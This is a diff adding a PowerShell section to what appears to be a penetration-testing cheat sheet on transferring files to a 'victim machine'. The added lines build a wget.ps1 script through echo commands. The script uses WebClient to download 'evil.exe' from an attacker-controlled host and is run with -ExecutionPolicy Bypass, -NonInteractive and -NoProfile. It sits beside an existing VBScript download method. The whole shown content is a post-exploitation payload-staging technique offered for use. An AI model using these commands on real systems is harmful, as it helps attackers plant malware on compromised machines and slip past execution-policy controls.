@@ -237,6 +237,23 @@ On victim machine shell:
 	echo ts.Close >> wget.vbs
 
 	cscript wget.vbs http://<[IP]>/<[FILE]> <[FILE_NAME]>
+	
+<b>Powershell</b> (In Windows 7, 2008 and above)
+
+On victim machine shell:
+
+	echo $storageDir = $pwd > wget.ps1
+	
+	echo $webclient = New-Object System.Net.WebClient >> wget.ps1
+	
+	echo $url = "http://<[IP]>/<[FILE]>" >> wget.ps1
+	
+	echo $file = "evil.exe" >> wget.ps1
+	
+	echo $webclient.DownloadFile($url,$file) >> wget.ps1
+	
+	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
 
 
 
